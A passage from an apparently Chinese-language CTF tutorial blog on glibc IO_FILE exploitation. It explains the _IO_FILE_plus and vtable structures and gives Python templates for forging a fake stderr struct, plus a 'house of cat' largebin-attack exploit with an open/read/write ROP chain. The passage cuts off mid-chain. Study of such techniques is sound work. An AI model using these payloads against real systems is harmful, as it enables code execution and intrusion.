  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div></div> <h5 id="_io_file_plusç»“æ„ä½“-åœ¨_io_fileåŸºç¡€ä¸ŠåŠ å…¥ä¸€ä¸ªvtableæŒ‡é’ˆè™šè¡¨æŒ‡é’ˆ-è™šè¡¨æŒ‡é’ˆä¸­å­˜æ”¾çš„æ˜¯ioç›¸å…³çš„æ“ä½œå‡½æ•°å…¶æ¬¡-æ³¨æ„ä¸Šé¢æºä»£ç ä¸­çš„ifdefå®å®šä¹‰-_io_file_plusä¸­çš„_io_fileä¹Ÿå¯ä»¥æŒ‡çš„æ˜¯_io_file_completeç»“æ„ä½“">â€ƒâ€ƒâ€ƒ<code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>ç»“æ„ä½“, åœ¨<code class="language-plaintext highlighter-rouge">_IO_FILE</code>åŸºç¡€ä¸ŠåŠ å…¥ä¸€ä¸ªvtableæŒ‡é’ˆ(è™šè¡¨æŒ‡é’ˆ), è™šè¡¨æŒ‡é’ˆä¸­å­˜æ”¾çš„æ˜¯IOç›¸å…³çš„æ“ä½œå‡½æ•°<br>â€ƒâ€ƒâ€ƒå…¶æ¬¡, æ³¨æ„ä¸Šé¢æºä»£ç ä¸­çš„<code class="language-plaintext highlighter-rouge">#ifdef</code>å®å®šä¹‰, <code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>ä¸­çš„<code class="language-plaintext highlighter-rouge">_IO_FILE</code>ä¹Ÿå¯ä»¥æŒ‡çš„æ˜¯<code class="language-plaintext highlighter-rouge">_IO_FILE_COMPLETE</code>ç»“æ„ä½“</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div> <h5 id="å…·ä½“æ˜¯é‚£ç§ç»“æ„-çŒœæµ‹å¯èƒ½ä¸ä½¿ç”¨çš„æ–‡ä»¶openå‡½æ•°æœ‰å…³-ä½†æ˜¯æ²¡è¯•è¿‡-æ— è®ºå¦‚ä½•-è¦ä¼ªé€ çš„stderræ˜¯_io_file_complete--vtable-çš„æ ·å¼æ­¤å¤–-åœ¨libcä¸­å­˜åœ¨ä¸€ä¸ªæŒ‡å‘_io_file_plusç»“æ„ä½“çš„_io_list_allæŒ‡é’ˆ-é€šå¸¸æƒ…å†µä¸‹æŒ‡å‘_io_2_1_stderr-ç„¶åstderråˆé€šè¿‡chainæŒ‡å‘stdout-stdoutæŒ‡å‘stdinå½“å‡ºç°äº†æ–°çš„æ–‡ä»¶æè¿°ç¬¦-ä¼šæ’å…¥åˆ°è¿™ä¸ªé“¾è¡¨çš„å¤´éƒ¨">â€ƒâ€ƒâ€ƒå…·ä½“æ˜¯é‚£ç§ç»“æ„, çŒœæµ‹å¯èƒ½ä¸ä½¿ç”¨çš„æ–‡ä»¶openå‡½æ•°æœ‰å…³, ä½†æ˜¯æ²¡è¯•è¿‡. æ— è®ºå¦‚ä½•, è¦ä¼ªé€ çš„stderræ˜¯<code class="language-plaintext highlighter-rouge">_IO_FILE_COMPLETE + vtable</code> çš„æ ·å¼<br>â€ƒâ€ƒâ€ƒæ­¤å¤–, åœ¨libcä¸­å­˜åœ¨ä¸€ä¸ªæŒ‡å‘<code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code>ç»“æ„ä½“çš„<code class="language-plaintext highlighter-rouge">_IO_list_all</code>æŒ‡é’ˆ, é€šå¸¸æƒ…å†µä¸‹æŒ‡å‘<code class="language-plaintext highlighter-rouge">_IO_2_1_stderr</code>, ç„¶åstderråˆé€šè¿‡chainæŒ‡å‘stdout, stdoutæŒ‡å‘stdin<br>â€ƒâ€ƒâ€ƒå½“å‡ºç°äº†æ–°çš„æ–‡ä»¶æè¿°ç¬¦, ä¼šæ’å…¥åˆ°è¿™ä¸ªé“¾è¡¨çš„å¤´éƒ¨<br> </h5> <h5 id="_io_jump_tç»“æ„ä½“-æœ‰è®¸å¤šæ“ä½œå‡½æ•°-ä½†æ˜¯ä¸åŒçš„_io_file_plus-å¯èƒ½ä¼šä½¿ç”¨ä¸åŒçš„è™šè¡¨-stderrstdoutstdinä½¿ç”¨çš„æ˜¯_io_file_jumps">â€ƒâ€ƒâ€ƒ<code class="language-plaintext highlighter-rouge">_IO_jump_t</code>ç»“æ„ä½“, æœ‰è®¸å¤šæ“ä½œå‡½æ•°, ä½†æ˜¯ä¸åŒçš„<code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>, å¯èƒ½ä¼šä½¿ç”¨ä¸åŒçš„è™šè¡¨, stderr/stdout/stdinä½¿ç”¨çš„æ˜¯<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code> </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="c">#if 0
    get_column;
    set_column;
#endif
</span><span class="p">};</span>
</code></pre></div></div> <h5 id="å¯¹äº__malloc_assertçš„è§¦å‘æ–¹æ³•-æˆ‘ä»¬éœ€è¦ä¼ªé€ stderrç»“æ„ä½“-ä»¥ä¸‹æ˜¯ä¸€ä¸ªé€šç”¨çš„æ¨¡æ¿httpsbbskanxuecomthread-273895htmmsg_header_h3_5">â€ƒâ€ƒâ€ƒå¯¹äº__malloc_assertçš„è§¦å‘æ–¹æ³•, æˆ‘ä»¬éœ€è¦ä¼ªé€ stderrç»“æ„ä½“, ä»¥ä¸‹æ˜¯ä¸€ä¸ªé€šç”¨çš„æ¨¡æ¿(https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_5)</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake_io_addr</span><span class="o">=</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0xb00</span> <span class="c1"># ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€
</span><span class="n">next_chain</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">fake_IO_FILE</span><span class="o">=</span><span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span>         <span class="c1">#_flags=rdi
</span><span class="n">fake_IO_FILE</span><span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#_IO_saveup_base rcx!=0(FSOP)
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0xb0</span><span class="p">)</span><span class="c1">#_IO_backup_base=rdx
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">call_addr</span><span class="p">)</span><span class="c1">#_IO_save_end=call addr(call setcontext/system)
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _chain
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0x1000</span><span class="p">)</span>  <span class="c1"># _lock = a writable address
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="c1">#_wide_data,rax1_addr
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xc0</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#mode=1
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libcbase</span><span class="o">+</span><span class="mh">0x2160c0</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># vtable=IO_wfile_jumps+0x10
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span>  <span class="c1"># rax2_addr
</span></code></pre></div></div> <h5 id="æ›´åŠ å…·ä½“çš„æ¨¡æ¿-æ¥è‡ªhttpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1dunfg8ywpvdpyd">â€ƒâ€ƒâ€ƒæ›´åŠ å…·ä½“çš„æ¨¡æ¿, æ¥è‡ªhttps://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DunFG8YwpVDpYD</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake_struct</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="err">#</span><span class="n">_IO_read_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_read_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_ptr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_buf_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_buf_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_save_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">)</span> <span class="err">#</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="n">rdx</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_addr</span><span class="p">)</span>           <span class="err">#</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="n">call_addr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_markers</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_chain</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_fileno</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_old_offset</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_cur_column</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span>   <span class="err">#</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="n">or</span> <span class="n">writeable</span> <span class="n">libc_addr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_offset</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_codecvx</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="err">#</span><span class="n">_wide_data</span> <span class="n">rax1</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_freers_list</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_freers_buf</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">__pad5</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_mode</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">20</span>               <span class="err">#</span><span class="n">_unused2</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_IO_wfile_jumps</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="err">#</span><span class="n">vtable</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>                 <span class="err">#</span><span class="n">padding</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span> <span class="err">#</span><span class="n">rax2</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fake_struct</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</code></pre></div></div> <h5 id="åœ¨å…·ä½“ä½¿ç”¨æ—¶-éœ€è¦æ›´æ”¹fake_io_addrä¸ºä¼ªé€ çš„fake_ioçš„å †çš„åœ°å€-_io_save_endä¸ºè¦è°ƒç”¨çš„å‡½æ•°å³call_addr-_io_backup_baseä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdx-ä»¥åŠä¿®æ”¹_flagså³rdiä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdi">â€ƒâ€ƒâ€ƒåœ¨å…·ä½“ä½¿ç”¨æ—¶, éœ€è¦æ›´æ”¹<code class="language-plaintext highlighter-rouge">fake_io_addr</code>ä¸ºä¼ªé€ çš„fake_IOçš„å †çš„åœ°å€, _IO_save_endä¸ºè¦è°ƒç”¨çš„å‡½æ•°(å³call_addr), _IO_backup_baseä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdx, ä»¥åŠä¿®æ”¹_flags(å³rdi)ä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdi<br> </h5> <h5>â€ƒâ€ƒâ€ƒ</h5> <h4 id="-__malloc_assertä¸¾ä¾‹">â€ƒ __malloc_assertä¸¾ä¾‹</h4> <h5 id="è¿™é‡Œä»¥é‚£é“è‘—åçš„-house-of-cat-ä¸¾ä¾‹-ä½†æ˜¯åªå…³æ³¨largebinçš„éƒ¨åˆ†-ç»•è¿‡æ²™ç®±çš„éƒ¨åˆ†å¿½ç•¥-ä½¿ç”¨äº†__malloc_assertè§¦å‘orwçš„æ–¹æ³•">â€ƒâ€ƒâ€ƒè¿™é‡Œä»¥é‚£é“è‘—åçš„ <code class="language-plaintext highlighter-rouge">house of cat</code> ä¸¾ä¾‹, ä½†æ˜¯åªå…³æ³¨largebinçš„éƒ¨åˆ†, ç»•è¿‡æ²™ç®±çš„éƒ¨åˆ†å¿½ç•¥.<br> â€ƒâ€ƒâ€ƒä½¿ç”¨äº†<code class="language-plaintext highlighter-rouge">__malloc_assert</code>è§¦å‘orwçš„æ–¹æ³•<br>â€ƒâ€ƒâ€ƒ</h5> <h5 id="ç¬¬ä¸€æ­¥æ˜¯è¦å…ˆæ³„éœ²å‡ºlibcå’ŒheapåŸºå€-è¿™éƒ¨åˆ†çœç•¥-è¯·å„æ˜¾ç¥é€š">â€ƒâ€ƒâ€ƒç¬¬ä¸€æ­¥æ˜¯è¦å…ˆæ³„éœ²å‡ºlibcå’ŒheapåŸºå€, è¿™éƒ¨åˆ†çœç•¥, è¯·å„æ˜¾ç¥é€š<br> </h5> <h5 id="ç¬¬äºŒæ­¥æ˜¯ä¼ªé€ ä¸€ä¸ª_io_file_plusç»“æ„-ç”¨äºç»•è¿‡æ£€æŸ¥ä»¥åŠåŠ«æŒè™šè¡¨">â€ƒâ€ƒâ€ƒç¬¬äºŒæ­¥æ˜¯ä¼ªé€ ä¸€ä¸ª_IO_FILE_PLUSç»“æ„, ç”¨äºç»•è¿‡æ£€æŸ¥ä»¥åŠåŠ«æŒè™šè¡¨<br> </h5> <h5 id="ç¬¬ä¸‰æ­¥æ˜¯é€šè¿‡largebin-attackå°†stderrä½¿ç”¨ä¼ªé€ çš„ç»“æ„ä½“æ›¿æ¢-">â€ƒâ€ƒâ€ƒç¬¬ä¸‰æ­¥æ˜¯é€šè¿‡largebin attackå°†stderrä½¿ç”¨ä¼ªé€ çš„ç»“æ„ä½“æ›¿æ¢, <br> </h5> <h5 id="ç¬¬å››æ­¥-å¼„ä¸€ä¸ªropæˆ–è€…æ˜¯orwä¹‹ç±»çš„-å’ŒäºŒä¸‰æ­¥é¡ºåºå¯ä»¥äº’æ¢">â€ƒâ€ƒâ€ƒç¬¬å››æ­¥, å¼„ä¸€ä¸ªROPæˆ–è€…æ˜¯ORWä¹‹ç±»çš„, å’ŒäºŒä¸‰æ­¥é¡ºåºå¯ä»¥äº’æ¢<br> </h5> <h5 id="ç¬¬äº”æ­¥-æƒ³åŠæ³•è§¦å‘__malloc_assert-å¸¸ç”¨çš„åŠæ³•æ˜¯ä¿®æ”¹top-chunk-size">â€ƒâ€ƒâ€ƒç¬¬äº”æ­¥, æƒ³åŠæ³•è§¦å‘__malloc_assert, å¸¸ç”¨çš„åŠæ³•æ˜¯ä¿®æ”¹top chunk size<br> </h5> <h5 id="æ¨¡æ¿ä¸­çš„call_addrä¿®æ”¹ä¸ºsetcontext61-å¹¶åœ¨rop_addræŒ‡ç¤ºçš„å †åœ°å€å¡«å…¥éœ€è¦çš„ropé“¾">â€ƒâ€ƒâ€ƒæ¨¡æ¿ä¸­çš„<code class="language-plaintext highlighter-rouge">call_addr</code>ä¿®æ”¹ä¸º<code class="language-plaintext highlighter-rouge">setcontext+61</code>, å¹¶åœ¨<code class="language-plaintext highlighter-rouge">rop_addr</code>æŒ‡ç¤ºçš„å †åœ°å€å¡«å…¥éœ€è¦çš„ropé“¾</h5> <h5 id="å®Œæ•´expå¯ä»¥çœ‹httpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1dunfg8ywpvdpyd-è¿™é‡Œå¯¹ä¼ªé€ çš„éƒ¨åˆ†åšæ›´å…·ä½“åœ°è§£é‡Š">â€ƒâ€ƒâ€ƒå®Œæ•´expå¯ä»¥çœ‹https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DunFG8YwpVDpYD, è¿™é‡Œå¯¹ä¼ªé€ çš„éƒ¨åˆ†åšæ›´å…·ä½“åœ°è§£é‡Š<br> </h5> <h5 id="-1">â€ƒâ€ƒâ€ƒ</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">...</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fwd
</span><span class="bp">...</span>
<span class="c1"># fake io struct
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">fake_struct</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>

<span class="nf">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># addr(2) = addr(4) , ç–‘ä¼¼æ˜¯ä¸ºäº†æ–¹ä¾¿è®¡ç®—åç§»
</span><span class="nf">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x418</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span> 
<span class="nf">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># victim
</span>
<span class="c1"># largebin attack(fake stderr struct)
</span><span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a0d0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x290</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span>

<span class="c1"># è§¦å‘ç¬¬ä¸€æ¬¡largebin attack(add(5)), åŒæ—¶ä¸ºåé¢ä¸€æ¬¡åˆ†é…å †(add(5), add(7))
</span><span class="nf">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x440</span><span class="p">,</span><span class="sh">"</span><span class="s">55555</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="sh">"</span><span class="s">./flag</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="sh">"</span><span class="s">77777</span><span class="sh">"</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">close</span><span class="p">)</span> <span class="c1">#close(0)
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1">#open(flag)
